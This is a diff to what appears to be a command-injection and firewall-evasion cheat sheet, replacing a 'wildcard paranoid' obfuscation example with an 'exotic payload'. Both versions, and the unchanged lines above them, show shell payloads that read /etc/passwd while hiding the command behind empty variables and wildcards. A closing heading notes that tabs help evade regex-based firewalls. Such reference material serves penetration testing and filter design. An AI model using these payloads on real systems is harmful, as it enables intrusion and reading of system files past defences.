@@ -1737,9 +1737,10 @@ Level 3 Obfuscation: Random chars
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
 
-Level 4 Obfuscation: Wildcard paranoid  
-__Standard__: `/bin/cat /etc/passwd`  
-__Obfuscated__: <code>$aaaaaa<b>/???</b>$bbbbbb<b>/??t</b>$ccccccc $dddddd<b>/???</b>$eeeeeee<b>/??ss??</b>$fffffff</code>
+An exotic payload crafted:
+<code>
+$sdijchkd<b>/???</b>$sdjhskdjh<b>/??t</b>$skdjfnskdj $sdofhsdhjs<b>/???</b>$osdihdhsdj<b>/??ss??</b>$skdjhsiudf
+</code>
 
 __12. Random Tabs__
 - Tabs often help to evade firewalls especially regex based ones.
